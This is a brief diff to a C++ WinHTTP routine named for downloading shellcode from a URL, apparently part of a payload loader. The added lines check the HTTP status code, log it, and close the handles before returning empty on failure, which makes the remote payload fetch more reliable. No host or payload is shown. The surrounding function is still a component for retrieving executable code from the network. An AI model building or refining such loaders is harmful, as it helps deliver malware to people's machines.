@@ -113,6 +113,26 @@ std::vector<BYTE> download(UrlParts shellcodeUrl) {
         hRequest,
         NULL);
 
+    DWORD statusCode = 0;
+    DWORD statusCodeSize = sizeof(statusCode);
+    WinHttpQueryHeaders(
+        hRequest,
+        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+        WINHTTP_HEADER_NAME_BY_INDEX,
+        &statusCode,
+        &statusCodeSize,
+        WINHTTP_NO_HEADER_INDEX);
+
+    DBG("HTTP status: %d", statusCode);
+
+    if (statusCode != 200) {
+        DBG("Unexpected HTTP status");
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return {};
+    }
+
     // read the data
     std::vector<BYTE> buffer;
     DWORD bytesRead = 0;
